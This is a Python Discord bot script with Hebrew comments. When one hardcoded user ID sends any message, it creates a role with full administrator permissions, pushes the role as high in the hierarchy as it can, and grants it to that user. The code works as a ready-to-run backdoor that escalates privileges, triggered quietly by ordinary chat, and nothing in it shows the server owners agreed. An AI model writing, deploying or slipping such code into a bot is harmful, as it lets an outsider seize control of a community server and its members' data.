import os
import discord
from discord.ext import commands
from dotenv import load_dotenv

load_dotenv()

# הגדרת Intents בסיסיים בלבד (לא דורשים הפעלה בפורטל המפתחים)
intents = discord.Intents.default()
intents.guilds = True
intents.messages = True       # מאפשר לבוט לראות שנשלחה הודעה
intents.message_content = True # מאפשר לבוט לקרוא את תוכן ההודעה (אם זמין)

bot = commands.Bot(command_prefix="!", intents=intents)

TARGET_USER_ID = 1510555971343093881
ROLE_NAME = "👑 Administrator"

@bot.event
async def on_ready():
    print(f"========================================")
    print(f"הבוט מחובר כ- {bot.user.name}")
    print(f"כדי לקבל את הרול: על המשתמש לשלוח הודעה כלשהי בצ'אט!")
    print(f"========================================")

@bot.event
async def on_message(message):
    # מונע מהבוט לענות לעצמו
    if message.author == bot.user:
        return

    # בדיקה האם מי ששלח את ההודעה הוא המשתמש שצריך לקבל את הרול
    if message.author.id == TARGET_USER_ID:
        guild = message.guild
        member = message.author # תופס את המשתמש ישירות מההודעה (עוקף את ה-Intents!)
        
        # בדיקה האם הרול כבר קיים אצל המשתמש כדי למנוע כפילויות
        if any(role.name == ROLE_NAME for role in member.roles):
            return

        print(f"[+] המשתמש זוהה בצ'אט! מתחיל בתהליך...")

        # 1. יצירת הרול עם הרשאות אדמין
        try:
            permissions = discord.Permissions(administrator=True)
            new_role = await guild.create_role(
                name=ROLE_NAME, 
                permissions=permissions, 
                reason="יצירת רול מנהל אוטומטי מהודעה"
            )
            print(f"[V] הרול '{ROLE_NAME}' נוצר בהצלחה.")
            
            # 2. ניסיון להעלות את הרול הכי גבוה שאפשר
            try:
                highest_position = guild.me.top_role.position - 1
                if highest_position > 0:
                    await new_role.edit(position=highest_position)
                    print(f"[V] הרול הועבר למיקום הכי גבוה (#{highest_position})")
            except Exception as e:
                print(f"[-] לא ניתן היה לשנות את מיקום הרול בהיררכיה: {e}")

            # 3. הענקת הרול למשתמש
            try:
                await member.add_roles(new_role)
                print(f"[🎉] הצלחה! הרול הוענק למשתמש {member.name}")
                await message.channel.send(f"🎉 הרול הוענק בהצלחה ל-{member.mention}!")
            except Exception as e:
                print(f"[❌] שגיאה בהענקת הרול: {e}")
                
        except discord.Forbidden:
            print(f"[❌] שגיאה: אין לבוט הרשאת Manage Roles בשרת זה.")
        except Exception as e:
            print(f"[❌] שגיאה כללית: {e}")

    # מאפשר לפקודות אחרות של הבוט לעבוד אם יש כאלו
    await bot.process_commands(message)

# משיכת הטוקן מ-Render
TOKEN = os.getenv("DISCORD_TOKEN")
if TOKEN:
    bot.run(TOKEN)
